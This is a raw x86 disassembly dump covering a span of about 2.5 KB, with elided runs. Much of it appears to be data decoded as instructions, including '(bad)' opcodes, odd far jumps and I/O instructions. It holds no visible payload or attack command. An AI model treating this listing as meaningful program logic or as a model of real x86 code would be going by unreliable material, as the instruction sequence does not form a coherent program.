  421c11:	dec    ebx
  421c12:	add    BYTE PTR [eax],0x87
  421c15:	fimul  WORD PTR [edi]
  421c17:	and    BYTE PTR [edi-0x60fff022],0x58
  421c1e:	add    BYTE PTR [eax],al
  421c20:	xchg   edi,eax
  421c21:	pop    eax
  421c22:	add    cl,BYTE PTR [eax]
  421c24:	addr16 pop esi
  421c26:	add    BYTE PTR [eax],al
  421c28:	outs   dx,DWORD PTR ds:[esi]
  421c29:	pop    esi
  421c2a:	add    cl,BYTE PTR [eax]
  421c2c:	push   edi
  421c2d:	pop    eax
  421c2e:	add    BYTE PTR [eax],cl
  421c30:	push   edi
  421c31:	pop    esi
  421c32:	add    BYTE PTR [eax],al
  421c34:	dec    edi
  421c35:	pop    eax
  421c36:	add    al,BYTE PTR [eax]
  421c38:	addr16 pop eax
  421c3a:	add    BYTE PTR [eax],cl
  421c3c:	pop    edi
  421c3d:	pop    esi
  421c3e:	add    al,BYTE PTR [eax]
  421c40:	pop    edi
  421c41:	pop    esi
  421c42:	add    BYTE PTR [eax],cl
  421c44:	das    
  421c45:	pop    esi
  421c46:	add    BYTE PTR [eax],cl
  421c48:	daa    
  421c49:	pop    esi
  421c4a:	add    al,BYTE PTR [eax]
  421c4c:	pop    ds
  421c4d:	pop    eax
  421c4e:	add    cl,BYTE PTR [eax]
	...
  421c78:	add    BYTE PTR [eax],al
  421c7a:	pop    ds
  421c7b:	pop    esi
  421c7c:	add    al,BYTE PTR [eax]
  421c7e:	daa    
  421c7f:	pop    esi
  421c80:	add    cl,BYTE PTR [eax]
  421c82:	addps  xmm0,XMMWORD PTR [eax]
  421c85:	add    BYTE PTR [edi],dl
  421c87:	pop    esi
  421c88:	add    BYTE PTR [eax],cl
  421c8a:	pop    ds
  421c8b:	pop    esi
  421c8c:	add    BYTE PTR [eax],al
  421c8e:	out    0x57,eax
  421c90:	add    cl,BYTE PTR [eax]
  421c92:	out    0x57,eax
  421c94:	add    BYTE PTR [eax],al
  421c96:	xlat   BYTE PTR ds:[ebx]
  421c97:	push   edi
  421c98:	add    al,BYTE PTR [eax]
  421c9a:	xlat   BYTE PTR ds:[ebx]
  421c9b:	pop    ebp
  421c9c:	add    cl,BYTE PTR [eax]
  421c9e:	iret   
  421c9f:	pop    ebp
  421ca0:	add    cl,BYTE PTR [eax]
  421ca2:	iret   
  421ca3:	push   edi
  421ca4:	add    al,BYTE PTR [eax]
  421ca6:	fist   WORD PTR [edi+0x0]
  421ca9:	or     bh,dl
  421cab:	push   edi
  421cac:	add    al,BYTE PTR [eax]
  421cae:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421caf:	pop    ebp
  421cb0:	add    al,BYTE PTR [eax]
  421cb2:	scas   eax,DWORD PTR es:[edi]
  421cb3:	push   edi
  421cb4:	add    BYTE PTR [eax],cl
  421cb6:	ds cld 
  421cb8:	add    BYTE PTR [eax],al
  421cba:	ds cld 
  421cbc:	add    al,BYTE PTR [edx]
  421cbe:	inc    esi
  421cbf:	add    al,0x3
  421cc1:	add    BYTE PTR [esi],bh
  421cc3:	add    al,0x1
  421cc5:	add    BYTE PTR [esi],dh
  421cc7:	add    al,0x3
  421cc9:	add    dh,BYTE PTR [esi]
  421ccb:	add    al,0x1
  421ccd:	add    BYTE PTR [esi-0x14],al
  421cd0:	add    BYTE PTR [edx],al
  421cd2:	ds in  al,dx
  421cd4:	add    al,BYTE PTR [eax]
  421cd6:	ds add al,0x1
  421cd9:	add    bh,BYTE PTR [esi]
  421cdb:	add    al,0x3
  421cdd:	add    al,BYTE PTR [eax]
	...
  421d07:	add    BYTE PTR [esi+0x4],al
  421d0a:	add    eax,DWORD PTR [eax]
  421d0c:	inc    esi
  421d0d:	add    al,0x1
  421d0f:	add    BYTE PTR [esi],bh
  421d11:	add    al,0x3
  421d13:	add    BYTE PTR [esi],bh
  421d15:	cld    
  421d16:	add    BYTE PTR [edx],al
  421d18:	ds jmp 0x3:0x2460202
  421d20:	ss cli 
  421d22:	add    BYTE PTR [eax],al
  421d24:	add    al,BYTE PTR ss:[ebx]
  421d27:	add    BYTE PTR [esi],bh
  421d29:	add    al,BYTE PTR [ecx]
  421d2b:	add    BYTE PTR [esi],bh
  421d2d:	jmp    0x2:0xfa360200
  421d34:	add    al,BYTE PTR ss:[ecx]
  421d37:	add    bh,BYTE PTR [esi]
  421d39:	add    al,BYTE PTR [ecx]
  421d3b:	add    BYTE PTR [esi-0x16],al
  421d3e:	add    al,BYTE PTR [edx]
  421d40:	ss cli 
  421d42:	add    BYTE PTR [eax],al
  421d44:	ds cli 
  421d46:	add    al,BYTE PTR [edx]
  421d48:	add    al,BYTE PTR ds:[ebx]
  421d4b:	add    bh,BYTE PTR [esi]
  421d4d:	jmp    0x201:0x2360000
  421d54:	ss cli 
  421d56:	add    al,BYTE PTR [eax]
  421d58:	inc    esi
  421d59:	pop    ebx
  421d5a:	out    dx,eax
  421d5b:	add    eax,0x3e75b3e
  421d60:	cmp    al,0x63
  421d62:	fild   WORD PTR ds:0x3df5b3c
  421d68:	ds pop ebx
  421d6a:	out    dx,eax
  421d6b:	add    eax,DWORD PTR [eax]
	...
  421d95:	add    BYTE PTR [ebx+eiz*2],bh
  421d98:	out    0x5,eax
  421d9a:	cmp    al,0x5b
  421d9c:	call   0x689ddbc4
  421da1:	and    edi,DWORD PTR [esi]
  421da3:	pop    ebx
  421da4:	push   0x675b3e23
  421da9:	add    edi,DWORD PTR [esi]
  421dab:	pop    ebx
  421dac:	and    edi,DWORD PTR [bp+0x685b]
  421db1:	add    edi,DWORD PTR [esi-0x41fc17a5]
  421db7:	pop    ebx
  421db8:	call   0xe79d5be0
  421dbd:	add    edi,DWORD PTR [esi]
  421dbf:	pop    ebx
  421dc0:	out    0x23,eax
  421dc2:	mov    esi,0xbe23e75a
  421dc7:	pop    edx
  421dc8:	push   0x685abe23
  421dcd:	add    edi,DWORD PTR [esi]
  421dcf:	pop    ebx
  421dd0:	out    0x3,eax
  421dd2:	ds pop ebx
  421dd4:	add    edi,DWORD PTR [bp-0x17a6]
  421dd9:	add    edi,DWORD PTR [esi+0x3e03e85a]
  421ddf:	pop    ebx
  421de0:	out    0x23,eax
  421de2:	ds pop ebx
  421de4:	out    0x3,eax
  421de6:	mov    esi,0xbe23e85a
  421deb:	pop    edx
  421dec:	addr16 add al,0x3e
  421def:	pop    ebx
  421df0:	out    0x3,eax
  421df2:	mov    esi,0x3e23e85a
  421df7:	pop    ebx
  421df8:	addr16 and al,0x0
	...
  421e23:	add    BYTE PTR [esi],bh
  421e25:	pop    ebx
  421e26:	add    BYTE PTR [eax+0x3a],ch
  421e29:	(bad)  
  421e2b:	out    0x3d,eax
  421e2d:	pop    ebx
  421e2e:	add    BYTE PTR [ecx+0x5a],ch
  421e31:	pop    ebx
  421e32:	add    BYTE PTR [ecx+0x42],ch
  421e35:	(bad)  
  421e37:	call   0x69427999
  421e3c:	(bad)  
  421e3d:	(bad)  
  421e3f:	addr16 pop edx
  421e41:	(bad)  
  421e43:	addr16 inc edx
  421e45:	pop    ebx
  421e46:	add    BYTE PTR [ecx+0x3a],ch
  421e49:	(bad)  
  421e4b:	out    0x3d,eax
  421e4d:	(bad)  
  421e4f:	call   0x6841f971
  421e54:	and    bl,bl
  421e56:	jmp    DWORD PTR [edi+0x3a]
  421e59:	pop    ebx
  421e5a:	add    cl,ch
  421e5c:	cmp    eax,0x3de9005b
  421e61:	pop    ebx
  421e62:	add    cl,ch
  421e64:	sbb    eax,0x1a68ffdb
  421e69:	pop    ebx
  421e6a:	add    BYTE PTR [ecx+0x42],ch
  421e6d:	(bad)  
  421e6f:	addr16 cmp bl,bl
  421e72:	jmp    edi
  421e74:	cmp    eax,0x5de8005b
  421e79:	(bad)  
  421e7b:	bound  ebx,QWORD PTR [bp+di+0x0]
  421e7f:	push   0x69005b5a
  421e84:	inc    edx
  421e85:	pop    ebx
  421e86:	add    BYTE PTR [eax+0x0],ch
	...
  421eb1:	add    BYTE PTR [edx-0x25],bl
  421eb4:	jmp    DWORD PTR [edi+0x42]
  421eb7:	pop    ebx
  421eb8:	add    al,ch
  421eba:	cmp    eax,0x1de9005b
  421ebf:	pop    ebx
  421ec0:	add    al,ch
  421ec2:	cmp    eax,0x1de7ffdb
  421ec7:	pop    ebx
  421ec8:	add    BYTE PTR [eax],al
  421eca:	cmp    al,BYTE PTR [bx+si+0x5600]
  421ecf:	pop    edx
  421ed0:	add    BYTE PTR [eax],0xd6
  421ed3:	cmp    al,BYTE PTR [eax]
  421ed5:	add    BYTE PTR [edi],ah
  421ed7:	cmp    al,BYTE PTR [eax]
  421ed9:	add    BYTE PTR [edi-0x69ff7fa6],ah
  421edf:	cmp    al,BYTE PTR [eax+0x5a1700]
  421ee5:	add    BYTE PTR [edi-0x58ff7fa6],ah
  421eeb:	cmp    al,BYTE PTR [eax]
  421eed:	add    BYTE PTR [edi],dl
  421eef:	cmp    al,BYTE PTR [eax+0x579700]
  421ef5:	add    BYTE PTR [edi+0x57],ah
  421ef8:	or     BYTE PTR [edx],al
  421efa:	addr16 pop edx
  421efc:	or     BYTE PTR [edx],al
  421efe:	push   edi
  421eff:	push   edi
  421f00:	add    BYTE PTR [edx+0x57],al
  421f03:	pop    edx
  421f04:	or     BYTE PTR [eax],al
  421f06:	addr16 push edi
  421f08:	add    BYTE PTR [eax],al
  421f0a:	addr16 pop edx
  421f0c:	add    BYTE PTR [eax+0x57],al
  421f0f:	pop    edx
  421f10:	or     BYTE PTR [edx],al
  421f12:	push   edi
  421f13:	push   edi
  421f14:	or     BYTE PTR [eax+0x0],al
	...
  421f3f:	add    BYTE PTR [edi],ah
  421f41:	pop    edx
  421f42:	or     BYTE PTR [eax],al
  421f44:	daa    
  421f45:	push   edi
  421f46:	add    BYTE PTR [edx],al
  421f48:	pop    ss
  421f49:	push   edi
  421f4a:	or     BYTE PTR [eax+0x17],al
  421f4d:	push   edi
  421f4e:	add    BYTE PTR [edx+0x27],al
  421f51:	pop    edx
  421f52:	or     BYTE PTR [edx+0x27],al
  421f55:	push   edi
  421f56:	or     BYTE PTR [eax],al
  421f58:	pop    ss
  421f59:	pop    edx
  421f5a:	add    BYTE PTR [eax+0x17],al
  421f5d:	pop    edx
  421f5e:	add    BYTE PTR [edx],al
  421f60:	out    0x59,eax
  421f62:	or     BYTE PTR [eax-0x19],al
  421f65:	pop    ecx
  421f66:	or     BYTE PTR [eax-0x29],al
  421f69:	pop    ecx
  421f6a:	add    BYTE PTR [eax],al
  421f6c:	ds add al,0x2
  421f6f:	add    BYTE PTR [esi+0x4],bh
  421f72:	add    cl,BYTE PTR [eax]
  421f74:	jl     0x421f7a
  421f76:	add    cl,BYTE PTR [eax]
  421f78:	jl     0x421f7e
  421f7a:	add    al,BYTE PTR [eax]
  421f7c:	cmp    al,0x4
  421f7e:	add    DWORD PTR [eax],ecx
  421f80:	cld    
  421f81:	add    eax,DWORD PTR [edx]
  421f83:	add    dh,bh
  421f85:	add    eax,DWORD PTR [ecx]
  421f87:	add    BYTE PTR [esi],bh
  421f89:	add    al,0x1
  421f8b:	add    ah,bh
  421f8d:	add    eax,DWORD PTR [edx]
  421f8f:	or     BYTE PTR [esp+eax*1],bh
  421f92:	add    DWORD PTR [eax],eax
  421f94:	cmp    al,0x4
  421f96:	add    DWORD PTR [eax],eax
  421f98:	cld    
  421f99:	add    eax,DWORD PTR [edx]
  421f9b:	or     BYTE PTR [esi],bh
  421f9d:	add    al,0x1
  421f9f:	or     BYTE PTR [esi],bh
  421fa1:	add    al,0x2
	...
  421fcb:	add    BYTE PTR [eax],al
  421fcd:	add    ah,bh
  421fcf:	add    eax,DWORD PTR [edx]
  421fd1:	add    BYTE PTR [esi],bh
  421fd3:	add    al,0x1
  421fd5:	add    BYTE PTR [esp+eax*1],bh
  421fd8:	add    DWORD PTR [eax],eax
  421fda:	inc    BYTE PTR [ebx]
  421fdc:	add    DWORD PTR [eax],ecx
  421fde:	cmp    al,0x4
  421fe0:	add    al,BYTE PTR [eax]
  421fe2:	cld    
  421fe3:	add    eax,DWORD PTR [edx]
  421fe5:	or     dh,bh
  421fe7:	add    eax,DWORD PTR [edx]
  421fe9:	add    BYTE PTR [edx+eax*1],bh
  421fec:	add    DWORD PTR [eax],eax
  421fee:	jle    0x421ff2
  421ff0:	add    DWORD PTR [eax],ecx
  421ff2:	jl     0x421ff6
  421ff4:	add    cl,BYTE PTR [eax]
  421ff6:	cmp    al,0x2
  421ff8:	add    cl,BYTE PTR [eax]
  421ffa:	jle    0x421ffe
  421ffc:	add    al,BYTE PTR [eax]
  421ffe:	add    al,BYTE PTR ds:[ecx]
  422001:	add    BYTE PTR [edx+eax*1],bh
  422004:	add    DWORD PTR [eax],ecx
  422006:	jl     0x42200a
  422008:	add    cl,BYTE PTR [eax]
  42200a:	jl     0x42200e
  42200c:	add    cl,BYTE PTR [eax]
  42200e:	ds pop ebx
  422010:	out    0x3,eax
  422012:	ds cdq 
  422014:	out    0x2,eax
  422016:	ss cdq 
  422018:	out    0x3,eax
  42201a:	inc    esi
  42201b:	pop    ecx
  42201c:	out    0x3,eax
  42201e:	ds pop ebx
  422020:	out    0x3,eax
  422022:	ss fwait
  422024:	out    0x3,eax
  422026:	ds cdq 
  422028:	out    0x2,eax
  42202a:	inc    esi
  42202b:	pop    ebx
  42202c:	out    0x2,eax
  42202e:	ds pop ecx
  422030:	out    0x2,eax
	...
  42205a:	add    BYTE PTR [eax],al
  42205c:	ds fwait
  42205e:	out    0x3,eax
  422060:	ss pop ebx
  422062:	out    0x3,eax
  422064:	ds pop ebx
  422066:	out    0x3,eax
  422068:	inc    esi
  422069:	fwait
  42206a:	out    0x2,eax
  42206c:	ss pop ecx
  42206e:	out    0x2,eax
  422070:	ds fwait
  422072:	xlat   BYTE PTR ds:[ebx]
  422073:	add    edi,DWORD PTR [esi]
  422075:	cmp    esp,edi
  422077:	add    edi,esi
  422079:	cmp    ah,bh
  42207b:	ret    
  42207c:	imul   ebp,esp,0x3b21c3f6
  422082:	out    0x3,eax
  422084:	(bad)  
  422085:	cmp    dh,bh
  422087:	add    edi,DWORD PTR [esi]
  422089:	pop    ebx
  42208a:	xlat   BYTE PTR ds:[ebx]
  42208b:	ret    
  42208c:	or     DWORD PTR [ebx],edi
  42208e:	out    0x3,eax
  422090:	(bad)  
  422091:	pop    edx
  422092:	out    0xc3,eax
  422094:	cmp    DWORD PTR [edi+edx*8-0x3d],ecx
  422098:	jno    0x4220f5
  42209a:	out    0x3,eax
  42209c:	jle    0x4220f9
  42209e:	test   DWORD PTR [ebx],0x3f73b3e
  4220a4:	jle    0x422101
  4220a6:	out    0xc3,eax
  4220a8:	adc    DWORD PTR [edi+eiz*8+0x3],ecx
  4220ac:	ds cmp edx,edi
  4220af:	ret    
  4220b0:	add    esp,ebp
  4220b2:	(bad)  
  4220b3:	call   0xd9427bf5
  4220b8:	cmp    eax,0xfdf9009b
  4220bd:	jmp    0x4220db
  4220bf:	jmp    0x4220c4
	...
  4220e8:	add    BYTE PTR [eax],al
  4220ea:	std    
  4220eb:	jmp    0x4220e9
  4220ed:	jmp    0xf9424cef
  4220f2:	std    
  4220f3:	jmp    0x422111
  4220f5:	fnstcw WORD PTR ds:0x3dd9005b
  4220fb:	fwait
  4220fc:	and    cl,bl
  4220fe:	cmp    eax,0x3de9209b
  422103:	pop    ebx
  422104:	add    cl,bh
  422106:	jge    0x422133
  422108:	add    cl,ch
  42210a:	jge    0x422137
  42210c:	and    cl,bh
  42210e:	jge    0x4220fb
  422110:	cld    
  422111:	jmp    0xe9424c93
  422116:	jge    0x422143
  422118:	and    cl,ch
  42211a:	cmp    eax,0x7de9205b
  42211f:	jmp    0x42213d
  422121:	fnstcw WORD PTR ds:0x3df9005b
  422127:	fwait
  422128:	and    cl,ch
  42212a:	jge    0x422157
  42212c:	add    cl,bh
  42212e:	jge    0x42215b
  422130:	and    cl,ch
  422132:	cmp    eax,0x7dd9009b
  422137:	jmp    0x422135
  422139:	fnstcw WORD PTR ds:0x3de9205b
  42213f:	fwait
  422140:	add    cl,ch
  422142:	std    
  422143:	jmp    0xf920:0x5b3de91c
  42214a:	std    
  42214b:	jmp    0x0:0xf9fc
	...
  422176:	add    BYTE PTR [eax],al
  422178:	cmp    eax,0xfdf9205b
  42217d:	sub    ah,BYTE PTR [eax]
  42217f:	add    BYTE PTR [edi],dl
  422181:	pop    ds
  422182:	cmp    eax,0x405f1700
  422187:	and    BYTE PTR [edi],dl
  422189:	pop    ds
  42218a:	cmp    eax,0x3d1ee700
  42218f:	and    bh,dl
  422191:	pop    esi
  422192:	add    BYTE PTR [eax],al
  422194:	out    0x5e,eax
  422196:	inc    eax
  422197:	and    bh,dl
  422199:	pop    esi
  42219a:	add    BYTE PTR [eax],al
  42219c:	out    0x1e,eax
  42219e:	std    
  42219f:	call   edi
  4221a1:	pop    esi
  4221a2:	inc    eax
  4221a3:	and    bh,ah
  4221a5:	push   ds
  4221a6:	cmp    eax,0xfd1ea700
  4221ab:	call   DWORD PTR [edi-0x58ffbfa2]
  4221b1:	push   ds
  4221b2:	std    
  4221b3:	pop    ds
  4221b4:	xchg   edi,eax
  4221b5:	pop    esi
  4221b6:	add    BYTE PTR [eax],al
  4221b8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4221b9:	push   ds
  4221ba:	cmp    eax,0x5ea720
  4221bf:	and    BYTE PTR [edi+0x5e],ah
  4221c2:	inc    eax
  4221c3:	add    BYTE PTR [edi+0x1e],ah
  4221c6:	std    
  4221c7:	pop    ds
  4221c8:	addr16 pop esi
  4221ca:	and    BYTE PTR [eax],al
  4221cc:	gs pop esi
  4221ce:	and    BYTE PTR [edx*2+0x5703fce6],al
  4221d5:	pop    esi
  4221d6:	add    BYTE PTR [eax],al
  4221d8:	addr16 out 0xfc,al
  4221db:	inc    DWORD PTR [eax]
	...
  422205:	add    BYTE PTR [ebp-0x1a],ah
  422208:	cld    
  422209:	add    edx,DWORD PTR [ebp-0x1a]
  42220c:	sbb    al,0x0
  42220e:	push   edi
  42220f:	out    0x1c,al
  422211:	add    al,0x25
  422213:	out    0x1c,al
  422215:	add    al,0x27
  422217:	pop    esi
  422218:	and    BYTE PTR [eax],al
  42221a:	pop    ss
  42221b:	pop    esi
  42221c:	add    BYTE PTR [eax],al
  42221e:	adc    eax,0x3e04005e
  422223:	test   BYTE PTR [eax],0x0
  422226:	ds hlt 
  422228:	add    BYTE PTR [eax],al
  42222a:	inc    edx
  42222b:	test   BYTE PTR [eax],0x20
  42222e:	cmp    dh,dh
  422230:	clc    
  422231:	(bad)  
  422232:	stc    
  422233:	repz clc 
  422235:	(bad)  
  422236:	cmp    eax,0x3e1ff8f6
  42223b:	test   BYTE PTR [eax],0x20
  42223e:	ds hlt 
  422240:	clc    
  422241:	(bad)  
  422242:	cmp    eax,0x3a0000f6
  422247:	hlt    
  422248:	add    BYTE PTR [eax],ah
  42224a:	inc    edx
  42224b:	hlt    
  42224c:	clc    
  42224d:	pop    ds
  42224e:	cmp    dh,dh
  422250:	add    BYTE PTR [eax],ah
  422252:	ds hlt 
  422254:	add    BYTE PTR [eax],ah
  422256:	cmp    dh,ah
  422258:	clc    
  422259:	jmp    FWORD PTR [ecx-0x5e00070b]
  42225f:	cmc    
  422260:	clc    
  422261:	pop    ds
  422262:	inc    edx
  422263:	hlt    
  422264:	clc    
  422265:	pop    ds
  422266:	test   BYTE PTR ds:[eax],0x0
	...
  422292:	add    BYTE PTR [eax],al
  422294:	ds hlt 
  422296:	add    BYTE PTR [eax],al
  422298:	cmp    dh,ah
  42229a:	clc    
  42229b:	pop    ds
  42229c:	ds hlt 
  42229e:	add    BYTE PTR [eax],al
  4222a0:	cmp    dh,ah
  4222a2:	clc    
  4222a3:	pop    ds
  4222a4:	ds hlt 
  4222a6:	add    BYTE PTR [eax],ah
  4222a8:	ds idiv al
  4222ab:	(bad)  
  4222ac:	cmp    eax,0x3dfff8f6
  4222b1:	test   BYTE PTR [eax],0x20
  4222b4:	inc    edx
  4222b5:	test   BYTE PTR [eax],0x20
  4222b8:	cmp    dh,dh
  4222ba:	add    BYTE PTR [eax],al
  4222bc:	ds hlt 
  4222be:	add    BYTE PTR [eax],ah
  4222c0:	repnz add BYTE PTR ds:[eax],al
  4222c4:	inc    edx
  4222c5:	pop    ebx
  4222c6:	out    0xfb,eax
  4222c8:	and    DWORD PTR [ebp-0x19],ebx
  4222cb:	add    ebx,DWORD PTR [esi+0x5b]
  4222ce:	out    0xfb,eax
  4222d0:	xor    DWORD PTR [edi-0x17],ebx
  4222d3:	sti    
  4222d4:	or     ecx,ebp
  4222d6:	call   0xe79d44d6
  4222db:	sti    
  4222dc:	pop    ecx
  4222dd:	pop    edi
  4222de:	jmp    0xe92b14de
  4222e3:	add    edi,DWORD PTR [esi]
  4222e5:	pop    edi
  4222e6:	jmp    0xe7a164e6
  4222eb:	add    ebx,DWORD PTR [esi]
  4222ed:	pop    edi
  4222ee:	out    0xfb,eax
  4222f0:	xor    DWORD PTR [ebx-0x19],ebx
  4222f3:	add    edi,DWORD PTR [esi]
  4222f5:	pop    ebx
  4222f6:	jmp    0x4222fe
	...
  42231f:	add    BYTE PTR [eax],al
  422321:	add    BYTE PTR [esi],bh
  422323:	pop    ebx
  422324:	jmp    0xe7a17d24
  422329:	add    edi,DWORD PTR [esi]
  42232b:	pop    ebx
  42232c:	jmp    0xe79d6d2c
  422331:	add    ebx,DWORD PTR [esi+0x5f]
  422334:	out    0xfb,eax
  422336:	cdq    
  422337:	call   0x5f802724
  42233c:	out    0xfb,eax
  42233e:	mov    DWORD PTR [edi+eiz*8-0x5],ebx
  422342:	sub    eax,0x5b1e03e8
  422348:	daa    
  422349:	hlt    
  42234a:	jno    0x4223a4
  42234c:	out    0xf3,eax
  42234e:	imul   ebp,eax,0x5b3a03e6
  422354:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422355:	repz cmp eax,0x3e03e74b
  42235b:	dec    ebx
  42235c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42235d:	repz dec ecx
  42235f:	pop    eax
  422360:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422361:	add    edi,DWORD PTR [esi]
  422363:	pop    ebx
  422364:	out    0x3,eax
  422366:	ds dec ebx
  422368:	add    BYTE PTR [ecx-0x16ffa0c3],ch
  42236e:	cmp    eax,0x2da9105f
  422373:	pop    esp
  422374:	adc    cl,ch
  422376:	or     eax,0xde9005c
  42237b:	pop    esp
  42237c:	adc    BYTE PTR [ecx-0x16ffa3f3],ch
  422382:	or     eax,0xa9fce8
	...
  4223af:	add    BYTE PTR ds:0x3de9005b,bh
  4223b5:	pop    edi
  4223b6:	adc    BYTE PTR [ecx-0x16efa4c3],ch
  4223bc:	in     eax,dx
  4223bd:	out    0xc,eax
  4223bf:	sub    edx,edx
  4223c1:	out    0xfc,eax
  4223c3:	jmp    0x29427f95
  4223c8:	inc    edx
  4223c9:	pop    edi
  4223ca:	add    BYTE PTR [ecx],ch
  4223cc:	cmp    bl,BYTE PTR [edi+0x10]
  4223cf:	jmp    0x29527f81
  4223d4:	stos   BYTE PTR es:[edi],al
  4223d5:	out    0xfc,eax
  4223d7:	jmp    0xe9427f19
  4223dc:	cmp    eax,0x4229005b
  4223e1:	pop    edi
  4223e2:	adc    BYTE PTR [ecx],ch
  4223e4:	cmp    bl,BYTE PTR [ebx+0x10]
  4223e7:	jmp    0x294f0b79
  4223ec:	mov    bl,BYTE PTR [ebx+0x0]
  4223ef:	jmp    0x29428331
  4223f4:	push   0x5b
  4223f6:	add    cl,ch
  4223f8:	cmp    eax,0x6de9005f
  4223fd:	pop    ebx
  4223fe:	adc    cl,ch
  422400:	dec    ebp
  422401:	out    0xfc,eax
  422403:	test   eax,0xa9005b3d
  422408:	cmp    eax,0x5700105f
  42240d:	jmp    0x42240b
  42240f:	jmp    edi
  422411:	jmp    0x0:0x0
	...
  42243c:	add    BYTE PTR [eax],al
  42243e:	daa    
  42243f:	jmp    0x42243d
  422441:	(bad)  
  422443:	pop    edx
  422444:	add    BYTE PTR [eax],al
  422446:	xlat   BYTE PTR ds:[ebx]
  422447:	pop    edx
  422448:	add    BYTE PTR [eax],dl
  42244a:	daa    
  42244b:	pop    ebx
  42244c:	add    al,0x10
  42244e:	out    0x5a,eax
  422450:	add    al,0x10
  422452:	pop    ss
  422453:	pop    ebx
  422454:	add    BYTE PTR [eax],dl
  422456:	pop    ss
  422457:	pop    ebx
  422458:	add    al,0x0
  42245a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42245b:	jmp    0x0:0x5ae70ffc
  422462:	xchg   edi,eax
  422463:	jmp    0x4:0x5f171000
  42246a:	daa    
  42246b:	pop    edi
  42246c:	add    BYTE PTR [eax],dl
  42246e:	out    0x5a,eax
  422470:	add    al,0x10
  422472:	xlat   BYTE PTR ds:[ebx]
  422473:	jmp    0xffc:0xef170ffc
  42247a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42247b:	pop    edx
  42247c:	add    BYTE PTR [eax],al
  42247e:	addr16 out dx,eax
  422480:	add    BYTE PTR [eax],dl
  422482:	xchg   edi,eax
  422483:	jmp    0x0:0xea970000
  42248a:	addr16 out dx,eax
  42248c:	cld    
  42248d:	jmp    DWORD PTR [edi-0x11]
  422490:	cld    
  422491:	call   DWORD PTR [edi+0x5f]
  422494:	add    al,0x0
  422496:	xchg   edi,eax
  422497:	pop    edx
  422498:	add    BYTE PTR [eax],dl
  42249a:	addr16 jmp 0xfffe:0x1d0f1000
	...
  4224ca:	add    BYTE PTR [eax],al
  4224cc:	push   edi
  4224cd:	pop    edx
  4224ce:	add    BYTE PTR [eax],al
  4224d0:	push   edi
  4224d1:	pop    edx
  4224d2:	add    BYTE PTR [eax],al
  4224d4:	xchg   edi,eax
  4224d5:	push   0x5c3efffd
  4224da:	cmp    edi,0x49
  4224dd:	test   al,0x80
  4224df:	inc    DWORD PTR [ecx-0xc]
  4224e2:	add    BYTE PTR [eax],al
  4224e4:	ds hlt 
  4224e6:	add    BYTE PTR [eax],al
  4224e8:	ds inc edx
  4224ea:	jnp    0x4224eb
  4224ec:	sub    DWORD PTR [eax],edi
  4224ee:	test   bh,bh
  4224f0:	and    DWORD PTR [ecx+eax*4-0x1],ebp
  4224f4:	sbb    esp,esi
  4224f6:	add    BYTE PTR [eax],al
  4224f8:	ds hlt 
  4224fa:	add    BYTE PTR [eax],al
  4224fc:	ds pop esp
  4224fe:	jnp    0x4224ff
  422500:	add    esp,edi
  422502:	jle    0x422503
  422504:	stc    
  422505:	add    DWORD PTR [ecx+0xf3f1ff],0x0
  42250c:	ds hlt 
  42250e:	add    BYTE PTR [eax],al
  422510:	sar    BYTE PTR ds:[edx-0x1],1
  422514:	fst    DWORD PTR [ebx-0x7e]
  422517:	call   ecx
  422519:	mov    bl,0x83
  42251b:	dec    ecx
  42251d:	repz add BYTE PTR [eax],al
  422520:	ds hlt 
  422522:	add    BYTE PTR [eax],al
  422524:	ds stos BYTE PTR es:[edi],al
  422526:	jp     0x422527
  422528:	mov    cl,0x43
  42252a:	cmp    bh,0xa9
  42252d:	mov    ebx,0xff83
	...
  42255a:	mov    eax,ds:0x3e0000f3
  42255f:	hlt    
  422560:	add    BYTE PTR [eax],al
  422562:	ds hlt 
  422564:	js     0x422565
  422566:	mov    DWORD PTR [ebx],ebp
  422568:	cmp    bh,0x81
  42256b:	mov    DWORD PTR [ebx+0xf379ff],0xf43e00
  422575:	add    BYTE PTR [esi],bh
  422577:	inc    edx
  422578:	jl     0x422579
  42257a:	popa   
  42257b:	pop    edx
  42257c:	retf   
  42257d:	sbb    DWORD PTR [ecx-0x1b],0xe5518456
  422584:	out    0x3,al
  422586:	ds pop ebx
  422588:	out    0x3,eax
  42258a:	ds pop ebx
  42258c:	sbb    DWORD PTR [ecx+edi*1-0x1b],edi
  422590:	data16 xor BYTE PTR [ecx],0xe5
  422594:	rol    BYTE PTR [edx+0x3e6e529],cl
  42259a:	ds pop ebx
  42259c:	out    0x3,eax
  42259e:	ds pop ebx
  4225a0:	in     eax,0x7a
  4225a2:	adc    ebp,esp
  4225a4:	inc    edx
  4225a5:	or     BYTE PTR [ecx],0xe5
  4225a8:	out    0x3,al
  4225aa:	ds pop ebx
  4225ac:	out    0x3,eax
  4225ae:	ds pop ebx
  4225b0:	out    0x3,eax
  4225b2:	ds pop ebx
  4225b4:	out    0x3,eax
  4225b6:	ds pop ebx
  4225b8:	out    0x3,eax
  4225ba:	ds pop ebx
  4225bc:	lahf   
  4225bd:	add    DWORD PTR [eax],0x0
	...
  4225e7:	add    cl,bl
  4225e9:	in     al,0xa4
  4225eb:	adc    ecx,0xc981b8e4
  4225f1:	in     al,0xc6
  4225f3:	add    ecx,0xb981d2e4
  4225f9:	in     al,0xbe
  4225fb:	xor    DWORD PTR [ecx-0x567f131c],0xa180d4e4
  422605:	in     al,0xc8
  422607:	sbb    BYTE PTR [ecx-0x6e7f291c],0xe4
  42260e:	rol    BYTE PTR [eax-0x7ee11b77],cl
  422614:	and    esp,0xe4798124
  42261a:	add    BYTE PTR [ecx+0x60ffe471],al
  422620:	mov    esi,0xbe4ffce4
  422625:	in     al,0xfc
  422627:	xchg   edi,eax
  422628:	mov    esi,0xbe29fce4
  42262d:	in     al,0xfc
  42262f:	cmp    DWORD PTR [esi-0x41b4031c],edi
  422635:	in     al,0xfc
  422637:	cmp    edi,DWORD PTR [esi-0x4e18031d]
  42263d:	in     al,0xfc
  42263f:	(bad)  [ecx-0x41fe031c]
  422645:	jecxz  0x422643
  422647:	out    0x99,eax
  422649:	in     al,0xfc
